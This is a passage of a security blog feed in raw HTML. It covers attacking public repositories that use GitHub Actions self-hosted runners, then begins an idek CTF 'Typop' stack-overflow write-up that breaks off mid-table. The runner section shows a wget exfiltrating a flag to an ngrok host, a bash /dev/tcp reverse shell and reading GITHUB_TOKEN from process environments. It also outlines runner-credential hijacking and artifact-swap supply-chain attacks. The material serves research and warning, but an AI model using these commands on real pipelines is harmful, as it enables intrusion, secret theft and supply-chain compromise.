&lt;p&gt;I changed&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;- run: echo &quot;Sorry, this level is not ready yet.... or is it?!&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;to&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;- run: wget https://XXXXXXXX.ngrok-free.app/$FLAG&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and… &lt;a href=&quot;https://github.com/litios/cicd/actions/runs/8835512260/job/24259832005&quot;&gt;it worked&lt;/a&gt; (kinda). I received the request but FLAG was empty.&lt;/p&gt;

&lt;p&gt;Wait, does that mean I can use the GitHub-runner token and use it to manipulate the repo?&lt;/p&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;jobs&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;attempt&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;runs-on&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ubuntu-latest&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;timeout-minutes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;permissions&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;id-token&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;write&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;contents&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;write&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;issues&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;write&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;GH_TOKEN&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;$&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;steps&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;gh auth status&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Run gh auth status
github.com
  ✓ Logged in to github.com account github-actions[bot] (GH_TOKEN)
  - Active account: true
  - Git operations protocol: https
  - Token: ghs_************************************
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As expected, this didn’t work. GitHub will indeed execute the pipeline but this will be dropped into a GitHub runner without any privileges. Trying to execute any &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gh&lt;/code&gt; command or any GitHub API queries will result in 403. Also, any secrets are not passed to the pipeline.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Side note: the default configuration for a new repository is that any new contributors will require approval in order to run any external pipelines. Still, this can be disabled so everyone can run it (and I’m pretty sure there are repositories out there with it enabled)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;At this point, I was no longer interested in the challenge but more in what could I do with this so I went back to playing with my own self-hosted runner.&lt;/p&gt;

&lt;h2 id=&quot;compromising-the-server&quot;&gt;Compromising the server&lt;/h2&gt;

&lt;p&gt;To set up a self-hosted runner, all you need to do is follow the steps pointed by GitHub:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Download the compressed runner code.&lt;/li&gt;
  &lt;li&gt;Configure against the repo with a token&lt;/li&gt;
  &lt;li&gt;Run it&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;And it will start receiving jobs.&lt;/p&gt;

&lt;p&gt;With this in mind, knowing the self-hosted runner will run &lt;strong&gt;any&lt;/strong&gt; code I pass, my next attempt was (as anyone will do) to try to execute a shell.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;na&quot;&gt;steps&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;|&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/XXXXXX/4444 0&amp;gt;&amp;amp;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Update the code, push again and… I got a reverse shell.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Listening on 0.0.0.0 4444
Connection received on XXXXXXX 48520
cicd@9a24bf4daf97:~/actions-runner/_work/cicd/cicd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, I guess I’m an unprivileged user, right…? A quick &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; showed that I was the same user as the one that set up the self-hosted runner.&lt;/p&gt;

&lt;p&gt;Can I read stuff? Yes.&lt;/p&gt;

&lt;p&gt;Can I edit stuff? Yes.&lt;/p&gt;

&lt;p&gt;A regular shell, the same privileges as I had when I first enabled the runner.&lt;/p&gt;

&lt;p&gt;Interesting enough, even if the original repository doesn’t have any workflows at all, this will still trigger as the newly created repos have the option of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Allow all actions and reusable workflows&lt;/code&gt; enabled by default.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/cicd-empty.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;potential-attacks&quot;&gt;Potential attacks&lt;/h2&gt;

&lt;p&gt;At this point, the damage is already done. You don’t &lt;strong&gt;own&lt;/strong&gt; the server (as you are not root and the runner will prevent you from running as root) but you can do some pretty nasty stuff.&lt;/p&gt;

&lt;p&gt;But now I want to explore potential vectors and attack surfaces.&lt;/p&gt;

&lt;h3 id=&quot;privilege-escalation-and-server-ownership&quot;&gt;Privilege escalation and server ownership&lt;/h3&gt;

&lt;p&gt;The default attack would be to attempt privilege escalation and try to own the server. Default privesc, I didn’t find any extra interest in this as it falls outside of the point of this experiment.&lt;/p&gt;

&lt;h3 id=&quot;token-hijacking&quot;&gt;Token hijacking&lt;/h3&gt;

&lt;p&gt;Once you control the runner, you can see every other job being executed.&lt;/p&gt;

&lt;p&gt;As we already discussed, the token provided by GitHub won’t have any privileges in our PR pipeline, but all we need to do is wait for another job from an actual contributor to run on the runner.&lt;/p&gt;

&lt;p&gt;We can wait for a work to happen and then we would be able to leak all the secrets used in the job, including the GitHub token, since we can access the environment and final script being run.&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps aux | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;_work
cicd        3752  0.0  0.0   4368  2944 pts/0    S+   12:56   0:00 /usr/bin/bash &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /home/cicd/actions-runner/_work/_temp/XXXXXX.sh
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/3752/environ 
&lt;span class=&quot;nv&quot;&gt;GITHUB_TOKEN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ghs_XXXXXXXXXXXXXXXX
&lt;span class=&quot;nv&quot;&gt;GITHUB_JOB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;GITHUB_REF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;refs/heads/master
&lt;span class=&quot;nv&quot;&gt;GITHUB_SHA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;XXXXXX
&lt;span class=&quot;nv&quot;&gt;GITHUB_REPOSITORY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;XXXXX/XXXX
&lt;span class=&quot;nv&quot;&gt;GITHUB_REPOSITORY_OWNER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;XXXXXXX
&lt;span class=&quot;nv&quot;&gt;GITHUB_REPOSITORY_OWNER_ID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;XXXXXX
&lt;span class=&quot;nv&quot;&gt;GITHUB_RUN_ID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;XXXXXX
&lt;span class=&quot;nv&quot;&gt;GITHUB_RUN_NUMBER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
&lt;span class=&quot;nv&quot;&gt;GITHUB_RETENTION_DAYS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;90
&lt;span class=&quot;nv&quot;&gt;GITHUB_RUN_ATTEMPT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the right permissions, this will mean we could modify the repository content.&lt;/p&gt;

&lt;h3 id=&quot;runner-hijacking&quot;&gt;Runner hijacking&lt;/h3&gt;

&lt;p&gt;Maybe the environment is a little restricted. Maybe we cannot run or do what we would like to do.&lt;/p&gt;

&lt;p&gt;No worries, just replace the runner! Since we have the same account as the runner, we can read the configuration files deployed during the auth step: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.runner&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.credentials&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.credentials.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;All we need to do is deploy the runner code in our own server, prepare the files with the same contents, disable the original runner (since we can stop the processes) and then run our own. Even a small network issue that may disconnect the runner may be used to our advantage since our runner will jump right in and the other one won’t be able to reconnect as we already have a session active. The original runner script won’t fail though, repeatedly trying to reconnect.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-rw-rw-r-- 1 cicd cicd       266 May  1 11:52 .credentials
-rw------- 1 cicd cicd      1667 May  1 11:51 .credentials_rsaparams
-rw-rw-r-- 1 cicd cicd         0 May  1 11:51 .env
-rw-rw-r-- 1 cicd cicd        99 May  1 11:52 .path
-rw-rw-r-- 1 cicd cicd       292 May  1 11:52 .runner
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The change will happen instantly and transparently, and now we are the runner.&lt;/p&gt;

&lt;h3 id=&quot;supply-chain-attack&quot;&gt;Supply chain attack&lt;/h3&gt;

&lt;p&gt;The coolest trick would be to go fully unnoticed. We all know how destructive the xz backdoor attempt could have been.&lt;/p&gt;

&lt;p&gt;If the GitHub repository holds a package that is distributed from the pipelines, we can use this to our advantage.&lt;/p&gt;

&lt;p&gt;All we need to do is prepare our malicious artifact and once the pipeline is triggered in the server, replace the crafted artifact with our own and it will be uploaded to the public repo without anyone noticing.&lt;/p&gt;

&lt;p&gt;If we don’t have full control of the server, all we need to do is combine this with the previous attack and we will be ready!&lt;/p&gt;

&lt;p&gt;This is extremely dangerous since everything will look perfectly fine from the pipeline side, logs won’t show anything different from any other run and there won’t be any proof of anything happening on the repo or the runner (unless the runner is monitored and hardened, but again, we can default to the previous attack)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/cicd-supply-chain.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;final-thoughts&quot;&gt;Final thoughts&lt;/h2&gt;

&lt;p&gt;What I have explored in this analysis is something that GitHub already warns &lt;a href=&quot;https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security&quot;&gt;in their documentation&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;We recommend that you only use self-hosted runners with private repositories. This is because forks of your public repository can potentially run dangerous code on your self-hosted runner machine by creating a pull request that executes the code in a workflow.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hopefully, this blog post makes you think twice before enabling a self-hosted runner in your public repository.&lt;/p&gt;</content><author><name>David Fernandez</name></author><category term="CICD" /><summary type="html">********************************************************************** ********************************************************************** ********************************************************************** ********************************************************************** *************************NX0kdollccccllodk0XN************************* ********************WNOdc;.. ...,cdONW******************** *****************WXkl,. .,lkX****************** ***************WKo,. .,oKW*************** *************WKo&apos; .oKW************* ************Nx,. .,&apos;.. ..&apos;,. &apos;xN************ ***********Xl. .dNNKko;...&apos;,;;;;;;,&apos;...;okKNNd. .lK*********** **********K:. ,0*****WK0KXNWWWWWWNXK0KW*****0, .:K********** *********Xc. &apos;O****************************O&apos; .cX********* ********Wo. ,0****************************0; .oN******** ********0, ;0W****************************W0;. ,0******** *******Wd. .kW*******************************O&apos; .dW******* *******Nc ;K********************************X: cN******* *******X: ;K********************************X: :X******* *******Nc &apos;0********************************0, cN******* *******Wo. .oN******************************Wo. .oW******* ********O&apos; .xN****************************Wx. &apos;O******** ********Nl. .c0W************************W0l. .lN******** *********K; &apos;;,. .:dOXNW**************WNXOd:. ;K********* *********W0, .,d0Ol. ..,:oK**********Xd:,.. ,0W********* **********W0;. .;ONO;. .oN**********No. .;0W********** ************Xl. &apos;kWNOdllokN************0, .oX************ *************WO:. .lOXNWWWWW************0, .:OW************* ***************NO:. ..,;;;lK************0, .ckN*************** *****************W0o;. ,0************0, .;d0W***************** ********************N0xc,..:K************K:..,cx0N******************** ************************NK0XW************WX0KN************************ ********************************************************************** ********************************************************************** ********************************************************************** **********************************************************************</summary></entry><entry><title type="html">Typop</title><link href="http://0.0.0.0:4000/2023/01/22/typop.html" rel="alternate" type="text/html" title="Typop" /><published>2023-01-22T00:00:00+01:00</published><updated>2023-01-22T00:00:00+01:00</updated><id>http://0.0.0.0:4000/2023/01/22/typop</id><content type="html" xml:base="http://0.0.0.0:4000/2023/01/22/typop.html">&lt;pre style=&quot;font-size: 0.6rem; text-align: center&quot;&gt;
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@#PPGPB@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@&amp;amp;?   .J&amp;amp;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@B~   :P@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@Y.   7#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#7   .Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@P^   ~G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@&amp;amp;J    ?&amp;amp;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@&amp;amp;J    ?&amp;amp;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@P^   ~G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@#7   .Y@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@Y.   7#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@B~   :P@@@@@@@@@#55555555555555G@@@@@@@@@@@@@
@@@@@@@@@@@@@&amp;amp;?   .J&amp;amp;@@@@@@@@@@Y              ~@@@@@@@@@@@@@
@@@@@@@@@@@@@#PPGPB@@@@@@@@@@@@#PGGGGGGGGGGGGPB@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;This was a pwn challenge rated with 408 points in idek CTF.
The instructions said:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;While writing the feedback form for idekCTF, JW made a small typo. It still compiled though, so what could possibly go wrong?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This binary involved handling canary and PIE protections and, in the way I solved it, stack pivoting.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;This is a very small binary with only a couple of functions. Let’s run it first to see what would be the normal output:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/typop_exec.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, we provide the answer to some questions and we can overflow the stack easily.&lt;/p&gt;

&lt;p&gt;Let’s take a look at the disassembly and see the main function:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/typop_main.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we expected, it &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; the first question and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getchar&lt;/code&gt; the response. If it’s 0x79 or ‘y’, then it continues and calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFeedback&lt;/code&gt;. If not, it exits.&lt;/p&gt;

&lt;p&gt;Let’s inspect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFeedback&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/typop_getfeedback.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can quickly see where the overflow is. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;buf&lt;/code&gt; to which we write is in $rbp-0x12 and in the first question already reads 0x1e. After that, it reads 0x5a, overflowing the stack.&lt;/p&gt;

&lt;p&gt;The first thing we need to defeat is the canary. The answer to the second question is what gets replied to us. We can use this to print the canary by providing the exact amount of characters to concatenate the canary like so:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;00&lt;/th&gt;
      &lt;th&gt;01&lt;/th&gt;
      &lt;th&gt;02&lt;/th&gt;
      &lt;th&gt;03&lt;/th&gt;
      &lt;th&gt;04&lt;/th&gt;
      &lt;th&gt;05&lt;/th&gt;
      &lt;th&gt;06&lt;/th&gt;
      &lt;th&gt;07&lt;/th&gt;
      &lt;th&gt;08&lt;/th&gt;
      &lt;th&gt;09&lt;/th&gt;
      &lt;th&gt;0a&lt;/th&gt;
      &lt;th&gt;0b&lt;/th&gt;
      &lt;th&gt;0c&lt;/th&gt;
      &lt;th&gt;0d&lt;/th&gt;
      &lt;th&gt;0e&lt;/th&gt;
      &lt;th&gt;0f&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;A \n char will be added at the end so it will be:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;00&lt;/th&gt;
      &lt;th&gt;01&lt;/th&gt;
      &lt;th&gt;02&lt;/th&gt;
      &lt;th&gt;03&lt;/th&gt;
      &lt;th&gt;04&lt;/th&gt;
      &lt;th&gt;05&lt;/th&gt;
      &lt;th&gt;06&lt;/th&gt;
      &lt;th&gt;07&lt;/th&gt;
      &lt;th&gt;08&lt;/th&gt;
      &lt;th&gt;09&lt;/th&gt;
      &lt;th&gt;0a&lt;/th&gt;
      &lt;th&gt;0b&lt;/th&gt;
      &lt;th&gt;0c&lt;/th&gt;
      &lt;th&gt;0d&lt;/th&gt;
      &lt;th&gt;0e&lt;/th&gt;
      &lt;th&gt;0f&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;0a&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
      &lt;td&gt;CAN&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RBP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
      &lt;td&gt;RSP&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Therefore we will rely on the chances of the canary ending up in 0x00. It will reply something like: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AAAAAAAAAAA\xAB\xCD\xEF\x0a...&lt;/code&gt; with the last part being the canary, until it founds a \x00.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;One important thing to consider is that the canary is the same during the whole execution and therefore dumping it once will allow to reuse it&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Now that we have the canary, we can overflow rbp and rsp to control execution. But what can we do with what? PIE is enabled and we don’t know what the offset is.&lt;/p&gt;

&lt;p&gt;But, we cano d the same technique again to dump rsp value because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getFeedback&lt;/code&gt; is executed in a loop in main. In this case, it would look like:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;00&lt;/th&gt;
      &lt;th&gt;01&lt;/th&gt;
      &lt;th&gt;02&lt;/th&gt;
      &lt;th&gt;03&lt;/th&gt;
      &lt;th&gt;04&lt;/th&gt;
      &lt;th&gt;05&lt;/th&gt;
      &lt;th&gt;06&lt;/th&gt;
      &lt;th&gt;07&lt;/th&gt;
      &lt;th&gt;08&lt;/th&gt;
      &lt;th&gt;09&lt;/th&gt;
      &lt;th&gt;0a&lt;/th&gt;
      &lt;th&gt;0b&lt;/th&gt;
      &lt;th&gt;0c&lt;/th&gt;
      &lt;th&gt;0d&lt;/th&gt;
      &lt;th&gt;0e&lt;/th&gt;
      &lt;th&gt;0f&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;00&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
      &lt;td&gt;AA&lt;/td&gt;
